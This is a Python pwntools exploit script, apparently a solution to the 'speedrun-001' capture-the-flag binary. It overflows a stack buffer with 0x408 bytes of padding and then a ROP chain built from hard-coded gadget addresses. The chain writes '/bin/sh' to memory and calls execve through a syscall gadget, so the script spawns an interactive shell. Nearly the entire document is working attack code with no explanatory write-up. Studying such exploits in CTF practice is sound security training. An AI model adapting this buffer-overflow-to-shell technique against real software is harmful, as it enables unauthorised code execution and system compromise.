from pwn import *

#target = process('./speedrun-001')
# For debugging, you might want to use context.binary
context.binary = './speedrun-001'  # Assuming the binary is in current directory
target = process('./speedrun-001')

# Establish our ROP Gadgets
popRax = p64(0x415664)
popRdi = p64(0x400686)
popRsi = p64(0x4101f3)
popRdx = p64(0x4498b5)

# 0x000000000048d251 : mov qword ptr [rax], rdx ; ret
writeGadget = p64(0x48d251)

# Our syscall gadget
syscall = p64(0x40129c)

# Build the ROP chain as bytes, not string
rop = b''

'''
Write "/bin/sh" to 0x6b6000
pop rdx, 0x2f62696e2f736800
pop rax, 0x6b6000
mov qword ptr [rax], rdx
'''
rop += popRdx
rop += b"/bin/sh\x00"  # The string "/bin/sh" with null byte
rop += popRax
rop += p64(0x6b6000)
rop += writeGadget

'''
Prep the four registers with their arguments, and make the syscall
pop rax, 0x3b (execve syscall number)
pop rdi, 0x6b6000 (pointer to "/bin/sh")
pop rsi, 0x0 (argv = NULL)
pop rdx, 0x0 (envp = NULL)
syscall
'''
rop += popRax
rop += p64(0x3b)  # execve syscall number

rop += popRdi
rop += p64(0x6b6000)  # pointer to "/bin/sh"

rop += popRsi
rop += p64(0)  # argv = NULL
rop += popRdx
rop += p64(0)  # envp = NULL

rop += syscall

# Add the padding to the saved return address
# 0x408 bytes of padding
payload = b"A" * 0x408 + rop

# Send the payload
target.sendline(payload)

# Drop to interactive shell
target.interactive()
